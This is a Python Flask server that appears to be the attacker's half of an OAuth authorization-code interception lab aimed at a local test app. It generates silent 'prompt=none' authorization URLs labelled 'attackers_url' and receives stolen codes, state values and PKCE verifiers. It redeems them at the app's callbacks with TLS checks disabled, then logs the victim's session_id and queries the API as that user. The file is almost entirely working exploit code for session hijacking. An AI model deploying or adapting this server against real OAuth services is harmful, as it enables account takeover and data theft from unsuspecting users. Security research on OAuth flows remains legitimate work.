from flask import Flask, request, jsonify, make_response
import requests
from flask_cors import CORS
from urllib.parse import urlparse, parse_qs
import logging
from colorama import init, Fore, Style
import urllib3
import json

# logging config
logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s:%(levelname)s: %(message)s", datefmt="%H:%M:%S")

# hack to hide SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
CORS(app)  # allow all origins


# settings
APP_HOST = 'https://app.local'

LOGIN_START_URL_PKCE_BACK = f'{APP_HOST}/pkce/login/start'
LOGIN_START_URL = f'{APP_HOST}/login/start'
LOGIN_START_URL_PKCE_FRONT = f'{APP_HOST}/login/start?mode=pkce-front'
CALLBACK_URL_DEFAULT = f'{APP_HOST}/callback'
CALLBACK_URL_PKCE_FRONT = f'{APP_HOST}/callback-pkce-post'
CALLBACK_URL_PKCE_BACK = f'{APP_HOST}/callback-pkce-back'

pre_auth_data = {}


def request_api(url, session_id):
    try:
        response = requests.get(url, cookies={'session_id': session_id}, verify=False)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        return {"error": str(e)}


@app.route('/oauth-params', methods=['GET'])
def get_oauth_params():
    mode = request.args.get('mode')

    if mode == 'pkce-back':
        start_url = LOGIN_START_URL_PKCE_BACK
    elif mode == 'pkce-front':
        start_url = LOGIN_START_URL_PKCE_FRONT
    else:
        start_url = LOGIN_START_URL

    try:
        authorization_url_response = requests.get(start_url, verify=False)
        authorization_url_response.raise_for_status()  # Raise error for bad responses
        data = authorization_url_response.json()

        if mode == "pkce-back":
            parsed_url = urlparse(data['url'])
            query_params = parse_qs(parsed_url.query)
            state = query_params['state'][0]
            set_cookie_header = authorization_url_response.headers.get('Set-Cookie')

            if set_cookie_header:
                cookies = requests.utils.dict_from_cookiejar(authorization_url_response.cookies)
                pre_auth_session = cookies.get('pre_auth_session')

            pre_auth_data[state] = {
                'pre_auth_session': pre_auth_session,
            }
            logging.info(
                f"{Fore.YELLOW}Obtained pre-auth session: {pre_auth_data[state]} for a state '{state}'{Style.RESET_ALL}")

        url = f"{data['url']}&response_mode=fragment&prompt=none"
        response = make_response(jsonify({"attackers_url": url}), 200)
        return response

    except requests.exceptions.RequestException as e:
        return jsonify({"error": str(e)}), 400


@app.route('/authorization-response', methods=['POST'])
def authorization_response():
    mode = request.args.get('mode')
    try:
        data = request.get_json()

        if mode == 'pkce-back':
            if not data or "code" not in data or "state" not in data:
                return jsonify({"error": "Missing 'code' or 'state' in request"}), 400

            code = data.get('code')
            state = data.get('state')
            pre_auth_session = pre_auth_data[state]['pre_auth_session']
            params = {
                'code': code,
                'state': state
            }
            session_response = requests.get(CALLBACK_URL_PKCE_BACK, params=params,
                                            cookies={'pre_auth_session': pre_auth_session}, verify=False, allow_redirects=False)

        elif mode == 'default':
            if not data or "code" not in data:
                return jsonify({"error": "Missing 'code' in request"}), 400
            code = data.get('code')
            params = {
                'code': code,
            }
            session_response = requests.get(CALLBACK_URL_DEFAULT, params=params,
                                            verify=False, allow_redirects=False)

        elif mode == 'pkce-front':
            if not data or "code" not in data or "codeVerifier" not in data:
                return jsonify({"error": "Missing 'code' or 'codeVerifier' in request"}), 400

            code = data.get('code')
            code_verifier = data.get('codeVerifier')
            params = {
                'code': code,
                'code_verifier': code_verifier
            }
            headers = {'Content-type': 'application/json'}
            session_response = requests.post(CALLBACK_URL_PKCE_FRONT, data=json.dumps(params), headers=headers,
                                             verify=False, allow_redirects=False)

        session_response.raise_for_status()
        session_id = None
        set_cookie_header = session_response.headers.get('Set-Cookie')
        if set_cookie_header:
            cookies = requests.utils.dict_from_cookiejar(session_response.cookies)
            session_id = cookies.get('session_id')
        logging.info(
            f"{Fore.YELLOW}Obtained user's session_id: {session_id}{Style.RESET_ALL}")

        api_response = request_api(f'{APP_HOST}/api', session_id)
        logging.info(
            f"{Fore.CYAN}Requested API: {api_response}{Style.RESET_ALL}")

        return jsonify({'status': "success"}), 200
    except requests.exceptions.RequestException as e:
        return jsonify({"error": str(e)}), 400


# Serve without TLS

if __name__ == '__main__':
    app.run(debug=True, host="127.0.0.1", port=5888
    )


# Serve with TLS

# if __name__ == '__main__':
#     app.run(debug=True, host="127.0.0.1", port=5443, ssl_context=(
#         "certs/dev.local.crt", "certs/dev.local.key"))
